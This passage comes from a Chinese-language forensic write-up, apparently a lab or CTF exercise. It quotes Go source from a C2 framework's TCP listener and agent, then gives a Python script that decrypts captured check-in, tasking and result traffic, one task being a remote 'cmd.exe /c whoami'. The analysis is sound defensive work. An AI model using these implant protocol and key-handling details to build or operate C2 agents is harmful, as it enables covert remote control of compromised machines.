⇒ 0000000040 05 a1 e9 4c 6c 73 69 e5 54 b1 b8 35 9a f4 82 8d   ...Llsi.T..5....
⇒ 0000000050 a4 ee 81 7f cb cf 4c bc ad 81 e6 f1 ad c0 ba 9c   ......L.........
⇒ 0000000060 05 3f b4 99 5c 90 d5 a1 a4 d5 76 b0 2d 39 4c 91   .?..\.....v.-9L.
```

listener\_gopher\_tcp还是有采用长连接的设定，避免频繁地建立和断开，减少开销同时也是为了更好的隐藏自己

![image.png](images/img_19028_025.png)

从源码上分析下加密和通信协议的细节

Extenders/listener\_gopher\_tcp/pl\_tcp.go 服务器需要发送数据时就会调用 sendMsg 函数

```
func sendMsg(conn net.Conn, data []byte) error {
	if conn == nil {
		return errors.New("conn is nil")
	}
	//创建一个4字节的切片
	msgLen := make([]byte, 4)
    //将载荷写入到 msgLen 切片中
	binary.BigEndian.PutUint32(msgLen, uint32(len(data)))
    //将 [4字节的长度前缀] 和 [原始载荷data] 拼接在一起
	message := append(msgLen, data...)
    //完整数据帧一次性写入TCP连接
	_, err := conn.Write(message)
	return err
}
```

![image.png](images/img_19028_026.png)

Extenders/agent\_gopher/pl\_agent.go AgentEncryptData 函数 加密层实现，如果是解密层AgentDecryptData 则是其逆操作，先分离 Nonce，再执行解密和验证

```
func AgentEncryptData(data []byte, key []byte) ([]byte, error) {
    /// START CODE
    //基于密钥创建 AES 密码块
    block, err := aes.NewCipher(key)
    if err != nil {
       return nil, err
    }
	//升级为 GCM 模式
    gcm, err := cipher.NewGCM(block)
    if err != nil {
       return nil, err
    }
	//创建一个 nonce
    nonce := make([]byte, gcm.NonceSize())
    //用加密安全的随机数填充 nonce
    _, err = io.ReadFull(rand.Reader, nonce)
    if err != nil {
       return nil, err
    }
    //Seal 函数执行加密和认证，并将 nonce 作为前缀附加到最终的密文前
    ciphertext := gcm.Seal(nonce, nonce, data, nil)

    /// END CODE
    return ciphertext, nil
}
```

![image.png](images/img_19028_027.png)

Extenders/listener\_gopher\_tcp/pl\_listener.go Agent 的第一次上线通信是向 C2 服务器注册自身并交换后续通信所用的会话密钥 (Session Key)

```
		//在创建监听器的配置中
		randSlice := make([]byte, 16)
		//使用 crypto/rand 生成安全的随机字节
		_, _ = rand.Read(randSlice)
		//将其设为监听器的加密密钥
		conf.EncryptKey = randSlice[:16]
		conf.Protocol = "tcp"
```

![image.png](images/img_19028_028.png)

Extenders/agent\_gopher/pl\_utils.go 上线包实际结构是三层嵌套的 Msgpack

```
type SessionInfo struct {
	Process    string `msgpack:"process"`
	PID        int    `msgpack:"pid"`
	User       string `msgpack:"user"`
	Host       string `msgpack:"host"`
	Ipaddr     string `msgpack:"ipaddr"`
	Elevated   bool   `msgpack:"elevated"`
	Acp        uint32 `msgpack:"acp"`
	Oem        uint32 `msgpack:"oem"`
	Os         string `msgpack:"os"`
	OSVersion  string `msgpack:"os_version"`
	EncryptKey []byte `msgpack:"encrypt_key"` //会话密钥
}
```

![image.png](images/img_19028_029.png)

Extenders/agent\_gopher/pl\_agent.go CreateAgent 函数是服务器解析这个上线包的反向过程

```
//从 initialData 解析出 Agent 信息
func CreateAgent(initialData []byte) (adaptix.AgentData, error) {
	var agent adaptix.AgentData

	/// START CODE HERE

	var sessionInfo SessionInfo
    // 使用 msgpack.Unmarshal 解析最内层的数据
	err := msgpack.Unmarshal(initialData, &sessionInfo)
	if err != nil {
		return adaptix.AgentData{}, err
	}

	...................
	//将解析出的密钥保存到 Agent 数据中
	agent.SessionKey = sessionInfo.EncryptKey

	/// END CODE

	return agent, nil
}
```

Extenders/agent\_gopher/pl\_agent.go PackTask函数用于服务器打包任务，ProcessTasksResult 函数则是反向解析回传的结果，逻辑与打包过程完全对应

```
func PackTasks(agentData adaptix.AgentData, tasksArray []adaptix.TaskData) ([]byte, error) {
	var packData []byte

	/// START CODE HERE

	var objects [][]byte
	var command Command

	for _, taskData := range tasksArray {
		taskId, err := strconv.ParseUint(taskData.TaskId, 16, 64)
		if err != nil {
			return nil, err
		}
		// taskData.Data 是第三层结构
		_ = msgpack.Unmarshal(taskData.Data, &command)
		command.Id = uint(taskId)
		// 1. 将 Command 结构（第二层）序列化为字节流
		cmd, _ := msgpack.Marshal(command)

		objects = append(objects, cmd)
	}
	// 2. 创建 Message 结构（顶层），并将序列化后的 Command 列表放入 object 字段
	message := Message{
		Type:   1,
		Object: objects,
	}
	//// 3. 将整个 Message 结构序列化为最终要加密的数据
	packData, _ = msgpack.Marshal(message)

	/// END CODE

	return packData, nil
}
```

![image.png](images/img_19028_030.png)

Extenders/listener\_gopher\_tcp/pl\_listener.go 创建新的监听器时，服务器会生成一个16字节密钥（**Listener Key**）

```
func (m *ModuleExtender) HandlerCreateListenerDataAndStart(name string, configData string, listenerCustomData []byte) (adaptix.ListenerData, []byte, any, error) {
	var (
		listenerData adaptix.ListenerData
		customdData  []byte
	)

	/// START CODE HERE

	var (
		listener *TCP
		conf     TCPConfig // TCPConfig 结构体将用于保存监听器的所有配置
		err      error
	)
.............................
    	//创建一个16字节的 byte 切片，准备存放密钥
		randSlice := make([]byte, 16)
    	//随机数生成器
		_, _ = rand.Read(randSlice)
    	//将生成的16字节随机数据赋值给配置对象的 EncryptKey 字段(Listener Key)
		conf.EncryptKey = randSlice[:16]
		conf.Protocol = "tcp"
	return listenerData, customdData, ok
}
```

Extenders/agent\_gopher/pl\_agent.go 使用监听器来生成一个新的 客户端时，服务器会把这个监听器绑定的 Listener Key 提取出来，并将其打包到 Agent 的配置信息中

```
func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map[string]any) ([]byte, error) {
	}
	//映射，根据键 "encrypt_key" 获取之前生成的 Listener Key
	encrypt_key, _ := listenerMap["encrypt_key"].(string)
    //将 Base64 编码的密钥字符串解码回原始的16字节 byte 切片
	encryptKey, err := base64.StdEncoding.DecodeString(encrypt_key)
	if err != nil {
		return nil, err
	}
		//配置被放入一个 Profile 结构体中
		profile := Profile{
			Type:        uint(agentWatermark),
			Addresses:   addresses,
			BannerSize:  len(tcp_banner),
			ConnTimeout: reconnectTimeout,
			ConnCount:   generateConfig.ReconnectCount,
			UseSSL:      Ssl,
			SslCert:     sslCert,
			SslKey:      sslKey,
			CaCert:      caCert,
		}
		profileData, _ = msgpack.Marshal(profile)

	default:
		return nil, errors.New("protocol unknown")
	}
	//使用 Listener Key (encryptKey) 对序列化后的配置数据 (profileData) 进行 AES-GCM 加密
	profileData, _ = AgentEncryptData(profileData, encryptKey)
 	//Agent 启动时，会先读取前16个字节作为解密密钥，再用它解密后面的配置
	profileData = append(encryptKey, profileData...)
	//拼接转成shellcode格式
	profileString := ""
	for _, b := range profileData {
		profileString += fmt.Sprintf("\x%02x", b)
	}

	return []byte(profileString), nil
}
```

Extenders/listener\_gopher\_tcp/pl\_tcp.go handleConnection 函数用來初次连接

```
func (handler *TCP) handleConnection(conn net.Conn, ts Teamserver) {

    // 1. 接收 Agent 发送过来的第一个数据帧
    recvData, err = recvMsg(conn)
    if err != nil {
        goto ERR
    }
    // 2. 使用存储在监听器配置中的 Listener Key (handler.Config.EncryptKey) 来解密接收到的数据
    recvData, err = DecryptData(recvData, handler.Config.EncryptKey)
    if err != nil {
        goto ERR
    }
    // 3. 将解密后的明文数据使用 MessagePack 反序列化为 initMsg 结构体。
    err = msgpack.Unmarshal(recvData, &initMsg)
    if err != nil {
        goto ERR
    }
    // 4. 检查 initMsg.Type 是否为 INIT_PACK，然后继续处理，
    //    最终会从 initPack.Data 中解析出 Agent 信息和新的会话密钥。
    switch initMsg.Type {
    case INIT_PACK:
        // ...
    }
}
```

根据源码分析的结果理下大致逻辑

**Agent 工作逻辑**

* Agent 启动后，从内存中找到硬编码的配置块（就是刚刚用ghidra找到的3969 字节数据块）
* 读取前16个字节，为 Listener Key
* 使用Listener Key解密字节块中剩余的部分，包括C2地址、端口.....
* Agent准备自己的上线信息，主机名、用户名IP地址等，并生成一个新的会话密钥 (Session Key)
* 将这些上线信息打包成 INIT\_PACK
* 使用Listener Key用AES-GCM 加密这个 INIT\_PACK发给Server
* 后续对话使用生成的会话密钥 (Session Key)加解密

由于刚刚都拿到3969 字节数据块了，所以自然 Listener Key也到手了，那后面就好办了，构建下python解密脚本

```
import struct
import msgpack
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import binascii

def decrypt_gopher_tcp(encrypted_traffic, key):
    if len(key) != 16:
        return "加密密钥必须是 16 字节长。"
    try:
        msg_len = struct.unpack('>I', encrypted_traffic[:4])[0]
        payload = encrypted_traffic[4:]
        if len(payload) < msg_len:
            return f"荷载不完整。期望 {msg_len} 字节，实际得到 {len(payload)} 字节。"
        encrypted_data = payload[:msg_len]
        nonce_size = 12
        if len(encrypted_data) < nonce_size:
            return "加密数据太短，不包含 nonce。"
        nonce = encrypted_data[:nonce_size]
        ciphertext = encrypted_data[nonce_size:]
        aesgcm = AESGCM(key)
        decrypted_msgpack = aesgcm.decrypt(nonce, ciphertext, None)
        return msgpack.unpackb(decrypted_msgpack, raw=False)
    except Exception as e:
        return f"解密过程中发生错误: {e}"

def pretty_print_data(data, indent=4):
    prefix = " " * indent
    if isinstance(data, dict):
        if not data:
            print(f"{prefix}(空字典)")
            return
        for key, value in data.items():
            print(f"{prefix}- {key}:", end="")
            if isinstance(value, (dict, list)):
                print()
                pretty_print_data(value, indent + 4)
            else:
                print(" ", end="")
                pretty_print_data(value, 0)
    elif isinstance(data, list):
        if not data:
            print(f"{prefix}(空列表)")
            return
        for i, item in enumerate(data):
            print(f"{prefix}- item #{i+1}:")
            pretty_print_data(item, indent + 4)
    elif isinstance(data, bytes):
        try:
            decoded_str = data.decode('gbk').strip()
            if decoded_str and all(c.isprintable() or c.isspace() for c in decoded_str):
                 print(f"'{decoded_str}'")
            else:
                raise UnicodeDecodeError("dummy", b'', 0, 0, "Not a printable string")
        except UnicodeDecodeError:
            hex_value = data.hex()
            display_value = hex_value[:80] + '...' if len(hex_value) > 80 else hex_value
            print(f"{display_value} (hex)")
    else:
        # 处理数字、布尔值等
        print(f"{data}")

def process_task_message(message_data):
    if not isinstance(message_data, dict) or 'object' not in message_data or 'type' not in message_data:
        print("结构不符合预期的任务/回传格式。")
        pretty_print_data(message_data)
        return
        
    object_list = message_data.get('object', [])
    print(f"消息类型: {message_data.get('type')}, 包含 {len(object_list)} 个对象")

    for i, command_bytes in enumerate(object_list):
        print(f"
    --- 对象 #{i+1} ---")
        try:
            # 第二层解码：从 object 字节流解码出 Command
            command_dict = msgpack.unpackb(command_bytes, raw=False)
            task_id = command_dict.get('id')
            command_code = command_dict.get('code')
            command_data_bytes = command_dict.get('data')

            print(f"    - Task ID: {task_id} (0x{task_id:x})")
            print(f"    - Command Code: {command_code}")
            
            # 第三层解码：从 Command 的 data 字节流解码出最终内容
            if command_data_bytes:
                print("    - Command Data:")
                try:
                    final_data = msgpack.unpackb(command_data_bytes, raw=False)
                    pretty_print_data(final_data, indent=8)
                except (msgpack.exceptions.UnpackException, msgpack.exceptions.ExtraData) as e:
                    print("        (数据不是msgpack格式，直接显示)")
                    pretty_print_data(command_data_bytes, indent=8)
            else:
                print("    - Command Data: (无)")

        except Exception as e:
            print(f"解析对象 #{i+1} 失败: {e}")
            print("    - 原始字节 (hex):")
            pretty_print_data(command_bytes, indent=8)


# --- 主程序执行 ---
if __name__ == "__main__":
    #原data.txt前16字节
    LISTENER_KEY = bytes.fromhex("291a84cda31c4f24da714ac5419ac293")
    #数据包 1中的encrypt_key
    SESSION_KEY = bytes.fromhex("511ef58d621ca17de4be70be61a6fd17")
    
    traffic_1_agent_init = "0000011445a455a2433dd8d2044105b5fb59ea9147bd7a7ca54add48919830c02c138417d6d9ea6770344cfde4497d9a5683c7b646fe9c8689de39b92d0030a15f8e9980a39b6fb0283261be9f54608efd6bded32646ae33456d7aceb0478b7b4bdd72b06a66804019349023efbef26937eaeeb172901f9f58c52611c5df3b3eaf8e1e1331be6df950c5bd0764d3bc2629a73323ec535783630ed05bafac3e48bd8ab3a9ef03073f098998fa175c78725e42b024d1f9a5a52ce75f2ab6983cc945b7ab211a43c5ea546255d0448a2e6005794d32681e50307f9283914d2f231f136b5c6dbe45f691851f7cc9ec81598829a93cb206c7b8ee63860e904d06b62f3c396ec1c36bd8fefe8ad5e081ded1c8fc5a829c31294c10"
    traffic_2_server_task = "00000079388e4f5b9cf177ffc20258e136fb51679eb3a142da2626ace2cf95c4b445399ab75ede171d13a783704f8be9e33703624d108772384f68cb0337f70954a563196776c04c254a27a87468d021fc29a2682f291dd0b5b5cfe56ba87092eb99bc42a615566d592d3876afb87a87954e15c0142f5228807ecc4d72"
    traffic_3_agent_result = "0000006cd1be5288d39a6cba0ddc82c9fa3b189fc50d29277d3cb8196fa65021605185c56e65085c55dd8d355ec825ece9c7aa11933afeb97dcd5becb5b4c0e005a1e94c6c7369e554b1b8359af4828da4ee817fcbcf4cbcad81e6f1adc0ba9c053fb4995c90d5a1a4d576b02d394c91"
    analysis_queue = [
        ("数据包 1: Agent -> Server (初始上线)", traffic_1_agent_init, LISTENER_KEY),
        ("数据包 2: Server -> Agent (任务下发)", traffic_2_server_task, SESSION_KEY),
        ("数据包 3: Agent -> Server (结果回传)", traffic_3_agent_result, SESSION_KEY)
    ]

    for description, hex_traffic, key in analysis_queue:
        print(f"
{'='*60}
正在处理: {description}
使用密钥: {key.hex()}
{'='*60}")
        raw_traffic_bytes = binascii.unhexlify(hex_traffic)
        decrypted_data = decrypt_gopher_tcp(raw_traffic_bytes, key)

        if isinstance(decrypted_data, str):
            print(f"解密失败: {decrypted_data}")
            continue
        
        print("解密成功!")
        
        if isinstance(decrypted_data, dict):
            pack_type_id = decrypted_data.get('id')

            if pack_type_id == 1: # INIT_PACK 的 ID 是 1
                print("数据包顶层结构: INIT_PACK")
                print("内层数据:")
                inner_data_bytes = decrypted_data.get('data')
                inner_data_dict = msgpack.unpackb(inner_data_bytes, raw=False)
                innermost_data_bytes = inner_data_dict.get('data')
                innermost_data_dict = msgpack.unpackb(innermost_data_bytes, raw=False)
                inner_data_dict['data'] = innermost_data_dict
                pretty_print_data(inner_data_dict)
            else:
                # 任务下发和结果回传也都是字典，但没有 'id' 键，而是 'type' 和 'object'
                print("数据包顶层结构: 任务/回传消息")
                print("解密内容:")
                process_task_message(decrypted_data)
        
        else:
            # 兼容未来可能出现的其他数据类型
            print(f"数据包顶层结构: 未知 (类型: {type(decrypted_data).__name__})")
            print("解密内容:")
            pretty_print_data(decrypted_data)
```

```
PS C:\Users\12410\Desktop> python .\decrypt_gopher_tcp.py

============================================================
正在处理: 数据包 1: Agent -> Server (初始上线)
使用密钥: 291a84cda31c4f24da714ac5419ac293
============================================================
解密成功!
数据包顶层结构: INIT_PACK
内层数据:
    - id: 1619542286
    - type: 2421052563
    - data:
        - process: agent.exe
        - pid: 2256
        - user: DESKTOP-K196DPF\Administrator
        - host: DESKTOP-K196DPF
        - ipaddr: 192.168.176.129
        - elevated: True
        - acp: 936
        - oem: 936
        - os: windows
        - os_version: Windows 10.0 build 22621
        - encrypt_key: 511ef58d621ca17de4be70be61a6fd17 (hex)

============================================================
正在处理: 数据包 2: Server -> Agent (任务下发)
使用密钥: 511ef58d621ca17de4be70be61a6fd17
============================================================
解密成功!
数据包顶层结构: 任务/回传消息
解密内容:
消息类型: 1, 包含 1 个对象

    --- 对象 #1 ---
    - Task ID: 1281430767 (0x4c6114ef)
    - Command Code: 3
    - Command Data:
        - program: C:\Windows\System32\cmd.exe
        - args:
            - item #1:
/c
            - item #2:
whoami

============================================================
正在处理: 数据包 3: Agent -> Server (结果回传)
使用密钥: 511ef58d621ca17de4be70be61a6fd17
============================================================
解密成功!
数据包顶层结构: 任务/回传消息
解密内容:
消息类型: 1, 包含 1 个对象

    --- 对象 #1 ---
    - Task ID: 1281430767 (0x4c6114ef)
    - Command Code: 3
    - Command Data:
        - output: desktop-k196dpf\administrator

```

解密后的数据信息跟服务端显示一致，这里分析的时候这几层结构体卡了蛮久，后面需要多多注意下

![image.png](images/img_19028_031.png)
